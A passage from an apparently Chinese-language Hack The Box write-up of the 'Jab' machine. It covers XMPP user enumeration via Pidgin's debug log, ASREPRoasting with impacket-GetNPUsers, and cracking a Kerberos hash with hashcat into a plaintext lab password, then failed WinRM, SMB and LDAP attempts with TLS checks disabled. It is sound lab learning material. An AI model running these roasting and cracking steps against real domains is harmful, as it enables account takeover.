+<p><a class="glightbox" href="../../evidence-img/HTB-Jab_client.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="HTB-Jab_client" src="../../evidence-img/HTB-Jab_client.png" /></a></p>
+<style>
+  .flex-container {
+    display: flex;
+    align-items: flex-start;
+  }
+  .flex-container > * {
+    margin-right: 20px;
+  }
+</style>
+
+<p><strong>添加账号：</strong></p>
+<div class="flex-container">
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin.png" alt="HTB-Jab-pidgin"></a>
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-1.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin-1.png" alt="HTB-Jab-pidgin-1"></a>
+</div>
+
+<p><strong>由于勾选了“在服务器上创建此新账号”，所以要注册：</strong></p>
+<div class="flex-container">
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-2.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin-2.png" alt="HTB-Jab-pidgin-2"></a>
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-3.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin-3.png" alt="HTB-Jab-pidgin-3"></a>
+</div>
+
+<p><strong>勾选启用进行连接（似乎刚注册的号需要等一段时间才能连接上）：</strong><br />
+然后探索一下这个XMPP客户端能干什么，发现了一个“搜索用户”的选项</p>
+<div class="flex-container">
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-4.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin-4.png" alt="HTB-Jab-pidgin-4"></a>
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-5.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin-5.png" alt="HTB-Jab-pidgin-5"></a>
+</div>
+
+<p><strong>根据提示，那直接用通配符试试搜索所有用户：</strong></p>
+<div class="flex-container">
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-6.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin-6.png" alt="HTB-Jab-pidgin-6"></a>
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-7.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin-7.png" alt="HTB-Jab-pidgin-7"></a>
+</div>
+
+<p><strong>由于无法复制用户清单，而我们又发现有个调试窗口，打开后再次执行刚刚的操作，可以发现调式窗口以XML格式输出了所有用户。点击保存。</strong></p>
+<div class="flex-container">
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-8.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin-8.png" alt="HTB-Jab-pidgin-8"></a>
+  <a class="glightbox" href="../../evidence-img/HTB-Jab-pidgin-9.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img src="../../evidence-img/HTB-Jab-pidgin-9.png" alt="HTB-Jab-pidgin-9"></a>
+</div>
+
+<p>提取用户清单中的Email：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>└─$<span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">&#39;\w+@jab.htb&#39;</span><span class="w"> </span>purple-debug.log<span class="w"> </span><span class="p">|</span><span class="w"> </span>uniq<span class="w"> </span>&gt;<span class="w"> </span>user.txt
+</span></code></pre></div></p>
+<p>至此，似乎卡住不知道该怎么办了，要密码喷洒感觉难度太大了，一点密码策略都不知道，纯纯暴破感觉不妥。</p>
+<p>想起来之前收藏的<strong><a href="https://orange-cyberdefense.github.io/ocd-mindmaps/">域渗透思维导图</a></strong>，机会难得，可以试一下是否有效。<br />
+根据这份思维导图，定位到“got username but no password”的位置，大体上有两个思路，一个就是上面提到的密码喷洒，另一个就是ASREPRoast。</p>
+<h2 id="asreproast">ASREPRoast<a class="headerlink" href="#asreproast" title="Permanent link">&para;</a></h2>
+<p>直接照做。一套下来，有3个用户可以无预认证获得TGT（hashcat格式），而其中1个用户凭据可以破解：<code>jmontgomery@jab.htb:Midnight_121</code>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>└─$<span class="w"> </span>impacket-GetNPUsers<span class="w"> </span>-outputfile<span class="w"> </span>GetNPUsers.hash<span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-usersfile<span class="w"> </span>user.txt<span class="w"> </span>jab.htb/<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.4
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>└─$<span class="w"> </span>cat<span class="w"> </span>GetNPUsers.hash
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nv">$krb5asrep$23$jmontgomery</span>@jab.htb@JAB.HTB:172dc7296896cda97daacb0e737246ec<span class="nv">$22</span>a82ab6b10b1947da4abc5d605292d5aa8c6fe54635ecb4107023c122eba597c1a7fdd14cd605ee4a8b001a01fb9b29bfb57e28c99eebe8de30a1ea680619bbbd7a90779569e39359c9ee424dfb8ea6dff1bd3e62f1652b47457501ba344683749f293603629e68629c002db27bef1a30be11a4eb95860c37b23a7c1461a3f4c0bf95709ea69978db20f9bb2f2882461aec11c3a2807dc11f32c3adad849d6a4a4a617b8b1b13a4ee67a983813301833180cf51f7abd9b0476d8acfccb8fe64f4f9554f7fd0eaaac1e258b43497f2eb0c8ec3fa749e4f6bebd4cc8cd65c66f58855
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nv">$krb5asrep$23$lbradford</span>@jab.htb@JAB.HTB:12ab21d5362ed0607532dd32922102fd<span class="nv">$8445081728</span>b932a7aa56594712ca12a44836d26932e0b6a50057ec346b24b7316d405f86a4cffe6ea54b0bf54b33fd6cacd6e13f5a6795024bd95c6653309ffe042ac3a26b86c5e053986ae9be6d9b82b7d9f58c130616d8de1d2625f240ea84d791b2fdca85ecb8a2a3ecb787f4f02fd4d3bc54a3003552ae34caee05b5122690b487b996879769f1aa790b42ce96a1c1fcf8f9deef50abb93822945d5cb9e1f2c357c38a3ffc1100ac2491bde95abc9ede3e56ae97da0541170d186c14dca95e1524c6a7d6714683baec02841379405f1b4c7cf77de168f41d9c3c41cd083af4cb
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="nv">$krb5asrep$23$mlowe</span>@jab.htb@JAB.HTB:f06a9e452c5fd320526d20b5f3c10651<span class="nv">$cb7496554c06c770a201e3b9c700408c4b893a82da439b13b6cc24e0a45a0512c3a4e065df2b97962efdde07f4d4abad2649d3f972277696721bc5730d314c82bdd45673b8bb6a7f32aafe526e641ad53f0de456d01d612a1c35475d491b93460545095b093f9c8045623d43b661a37cf20d07e9f26a2f8dd705570ea9c865897423de702ea713ca042d41e4fd736d438f46af7ca7dec79fc2feedd63fa95d2032b927760aa4c7c4c8166e4d89899746ea36ac197f3af23be8863147db3ca30b81139677c2ec939b4b72471bbd0dcc8d25f5e868c116ac9afaf58d6f6076c598d21e</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>└─$<span class="w"> </span>hashcat<span class="w"> </span>GetNPUsers.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>hashcat<span class="w"> </span><span class="o">(</span>v6.2.6<span class="o">)</span><span class="w"> </span>starting<span class="w"> </span><span class="k">in</span><span class="w"> </span>autodetect<span class="w"> </span>mode
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>OpenCL<span class="w"> </span>API<span class="w"> </span><span class="o">(</span>OpenCL<span class="w"> </span><span class="m">3</span>.0<span class="w"> </span>PoCL<span class="w"> </span><span class="m">4</span>.0+debian<span class="w">  </span>Linux,<span class="w"> </span>None+Asserts,<span class="w"> </span>RELOC,<span class="w"> </span>SPIR,<span class="w"> </span>LLVM<span class="w"> </span><span class="m">15</span>.0.7,<span class="w"> </span>SLEEF,<span class="w"> </span>DISTRO,<span class="w"> </span>POCL_DEBUG<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>Platform<span class="w"> </span><span class="c1">#1 [The pocl project]</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="o">==================================================================================================================================================</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>*<span class="w"> </span>Device<span class="w"> </span><span class="c1">#1: cpu-haswell-AMD Ryzen 7 3700X 8-Core Processor, 1601/3266 MB (512 MB allocatable), 4MCU</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>Hash-mode<span class="w"> </span>was<span class="w"> </span>not<span class="w"> </span>specified<span class="w"> </span>with<span class="w"> </span>-m.<span class="w"> </span>Attempting<span class="w"> </span>to<span class="w"> </span>auto-detect<span class="w"> </span><span class="nb">hash</span><span class="w"> </span>mode.
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>The<span class="w"> </span>following<span class="w"> </span>mode<span class="w"> </span>was<span class="w"> </span>auto-detected<span class="w"> </span>as<span class="w"> </span>the<span class="w"> </span>only<span class="w"> </span>one<span class="w"> </span>matching<span class="w"> </span>your<span class="w"> </span>input<span class="w"> </span>hash:
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="m">18200</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">23</span>,<span class="w"> </span>AS-REP<span class="w"> </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>
+</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="w"> </span><span class="o">(</span>...<span class="o">)</span>
+</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>
+</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>Dictionary<span class="w"> </span>cache<span class="w"> </span>built:
+</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>*<span class="w"> </span>Filename..:<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>*<span class="w"> </span>Passwords.:<span class="w"> </span><span class="m">14344392</span>
+</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>*<span class="w"> </span>Bytes.....:<span class="w"> </span><span class="m">139921507</span>
+</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>*<span class="w"> </span>Keyspace..:<span class="w"> </span><span class="m">14344385</span>
+</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>*<span class="w"> </span>Runtime...:<span class="w"> </span><span class="m">0</span><span class="w"> </span>secs
+</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>
+</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a><span class="nv">$krb5asrep$23$jmontgomery</span>@jab.htb@JAB.HTB:172dc7296896cda97daacb0e737246ec<span class="nv">$22</span>a82ab6b10b1947da4abc5d605292d5aa8c6fe54635ecb4107023c122eba597c1a7fdd14cd605ee4a8b001a01fb9b29bfb57e28c99eebe8de30a1ea680619bbbd7a90779569e39359c9ee424dfb8ea6dff1bd3e62f1652b47457501ba344683749f293603629e68629c002db27bef1a30be11a4eb95860c37b23a7c1461a3f4c0bf95709ea69978db20f9bb2f2882461aec11c3a2807dc11f32c3adad849d6a4a4a617b8b1b13a4ee67a983813301833180cf51f7abd9b0476d8acfccb8fe64f4f9554f7fd0eaaac1e258b43497f2eb0c8ec3fa749e4f6bebd4cc8cd65c66f58855:Midnight_121
+</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>Approaching<span class="w"> </span>final<span class="w"> </span>keyspace<span class="w"> </span>-<span class="w"> </span>workload<span class="w"> </span>adjusted.
+</span></code></pre></div></p>
+<h2 id="jmontgomery">jmontgomery凭据下的探索<a class="headerlink" href="#jmontgomery" title="Permanent link">&para;</a></h2>
+<h3 id="winrm">winrm连接失败<a class="headerlink" href="#winrm" title="Permanent link">&para;</a></h3>
+<p>拿到一个凭据，且域控有开放5985端口，首先该想到尝试<code>evil-winrm</code>连接。<br />
+不过结果失败：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>└─$<span class="w"> </span>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.11.4<span class="w"> </span>-u<span class="w"> </span>jmontgomery<span class="w"> </span>-p<span class="w"> </span>Midnight_121
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>Evil-WinRM<span class="w"> </span>shell<span class="w"> </span>v3.5
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>Warning:<span class="w"> </span>Remote<span class="w"> </span>path<span class="w"> </span>completions<span class="w"> </span>is<span class="w"> </span>disabled<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>ruby<span class="w"> </span>limitation:<span class="w"> </span>quoting_detection_proc<span class="o">()</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>is<span class="w"> </span>unimplemented<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>machine
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>Data:<span class="w"> </span>For<span class="w"> </span>more<span class="w"> </span>information,<span class="w"> </span>check<span class="w"> </span>Evil-WinRM<span class="w"> </span>GitHub:<span class="w"> </span>https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>Info:<span class="w"> </span>Establishing<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span>remote<span class="w"> </span>endpoint
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>Error:<span class="w"> </span>An<span class="w"> </span>error<span class="w"> </span>of<span class="w"> </span><span class="nb">type</span><span class="w"> </span>WinRM::WinRMAuthorizationError<span class="w"> </span>happened,<span class="w"> </span>message<span class="w"> </span>is<span class="w"> </span>WinRM::WinRMAuthorizationError
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>Error:<span class="w"> </span>Exiting<span class="w"> </span>with<span class="w"> </span>code<span class="w"> </span><span class="m">1</span>
+</span></code></pre></div></p>
+<h3 id="smb">SMB连接失败<a class="headerlink" href="#smb" title="Permanent link">&para;</a></h3>
+<p>那么从头开始，SMB、LDAP收集信息。</p>
+<p>SMB无法登陆：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>└─$<span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//10.10.11.4/<span class="w"> </span>-U<span class="w"> </span>jab.htb/montgomery%Midnight_121<span class="w">  </span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>session<span class="w"> </span>setup<span class="w"> </span>failed:<span class="w"> </span>NT_STATUS_LOGON_FAILURE
+</span></code></pre></div></p>
+<h3 id="ldap">LDAP无有用信息<a class="headerlink" href="#ldap" title="Permanent link">&para;</a></h3>
+<p>LDAP似乎要求LDAPS连接。
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>└─$<span class="w"> </span>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.10.11.4<span class="w"> </span>-D<span class="w"> </span>jmontgomery@jab.htb<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Midnight_121&#39;</span><span class="w">                                       </span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>ldap_bind:<span class="w"> </span>Strong<span class="o">(</span>er<span class="o">)</span><span class="w"> </span>authentication<span class="w"> </span>required<span class="w"> </span><span class="o">(</span><span class="m">8</span><span class="o">)</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">        </span>additional<span class="w"> </span>info:<span class="w"> </span><span class="m">00002028</span>:<span class="w"> </span>LdapErr:<span class="w"> </span>DSID-0C090389,<span class="w"> </span>comment:<span class="w"> </span>The<span class="w"> </span>server<span class="w"> </span>requires<span class="w"> </span>binds<span class="w"> </span>to<span class="w"> </span>turn<span class="w"> </span>on<span class="w"> </span>integrity<span class="w"> </span>checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>SSL<span class="se">\T</span>LS<span class="w"> </span>are<span class="w"> </span>not<span class="w"> </span>already<span class="w"> </span>active<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>connection,<span class="w"> </span>data<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>v4563
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>└─$<span class="w"> </span>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldaps://10.10.11.4<span class="w"> </span>-D<span class="w"> </span>jmontgomery@jab.htb<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Midnight_121&#39;</span><span class="w"> </span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>ldap_sasl_bind<span class="o">(</span>SIMPLE<span class="o">)</span>:<span class="w"> </span>Can<span class="err">&#39;</span>t<span class="w"> </span>contact<span class="w"> </span>LDAP<span class="w"> </span>server<span class="w"> </span><span class="o">(</span>-1<span class="o">)</span>
+</span></code></pre></div></p>
+<p>使用debug模式看了眼，似乎是因为客户端不信任服务器的SSL证书。<br />
+搜了下解决方法——用<code>export LDAPTLS_REQCERT=never</code>直接不验证证书，于是可以使用了。<br />
+先看了眼jmontgomery属于哪个OU，大致了解下OU结构。然后试着搜了搜几个OU的description，没什么有用信息。
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>└─$<span class="w"> </span>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldaps://10.10.11.4<span class="w"> </span>-D<span class="w"> </span>jmontgomery@jab.htb<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Midnight_121&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="m">1</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>ldap_url_parse_ext<span class="o">(</span>ldaps://10.10.11.4<span class="o">)</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>ldap_create
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>ldap_url_parse_ext<span class="o">(</span>ldaps://10.10.11.4:636/??base<span class="o">)</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>ldap_sasl_bind
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>ldap_send_initial_request
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>ldap_new_connection<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">0</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>ldap_int_open_connection
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>ldap_connect_to_host:<span class="w"> </span>TCP<span class="w"> </span><span class="m">10</span>.10.11.4:636
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>ldap_new_socket:<span class="w"> </span><span class="m">3</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>ldap_prepare_socket:<span class="w"> </span><span class="m">3</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>ldap_connect_to_host:<span class="w"> </span>Trying<span class="w"> </span><span class="m">10</span>.10.11.4:636
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>ldap_pvt_connect:<span class="w"> </span>fd:<span class="w"> </span><span class="m">3</span><span class="w"> </span>tm:<span class="w"> </span>-1<span class="w"> </span>async:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>attempting<span class="w"> </span>to<span class="w"> </span>connect:<span class="w"> </span>
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>connect<span class="w"> </span>success
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>TLS:<span class="w"> </span>peer<span class="w"> </span>cert<span class="w"> </span>untrusted<span class="w"> </span>or<span class="w"> </span>revoked<span class="w"> </span><span class="o">(</span>0x142<span class="o">)</span>
+</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>TLS:<span class="w"> </span>can<span class="s1">&#39;t connect: (unknown error code).</span>
+</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="s1">ldap_err2string</span>
+</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="s1">ldap_sasl_bind(SIMPLE): Can&#39;</span>t<span class="w"> </span>contact<span class="w"> </span>LDAP<span class="w"> </span>server<span class="w"> </span><span class="o">(</span>-1<span class="o">)</span>
+</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>
+</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>
+</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>└─$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">LDAPTLS_REQCERT</span><span class="o">=</span>never
+</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>
+</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>└─$<span class="w"> </span>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldaps://10.10.11.4<span class="w"> </span>-D<span class="w"> </span>jmontgomery@jab.htb<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Midnight_121&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=jab,DC=htb&quot;</span><span class="w"> </span><span class="s2">&quot;(userPrincipalName=jmontgomery@jab.htb)&quot;</span>
